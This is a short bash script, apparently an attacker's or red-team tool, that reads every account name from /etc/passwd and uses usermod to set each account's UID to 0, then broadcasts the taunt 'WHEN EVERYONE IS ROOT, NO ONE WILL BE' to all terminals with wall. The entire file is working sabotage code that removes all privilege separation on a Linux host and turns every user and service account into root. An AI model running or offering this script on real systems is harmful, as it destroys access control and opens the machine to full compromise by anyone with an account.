#!/bin/bash

# pulls list of users from /etc/passwd
users=$(awk -F: '{print $1}' < /etc/passwd)

# use newline as delimiter for for-loop
IFS=$'\n'

# loop over all users
for user in $users
do
    # set user uid to 0
    usermod -ou 0 $user
done

# signature catch phrase
echo "WHEN EVERYONE IS ROOT, NO ONE WILL BE" | /usr/bin/wall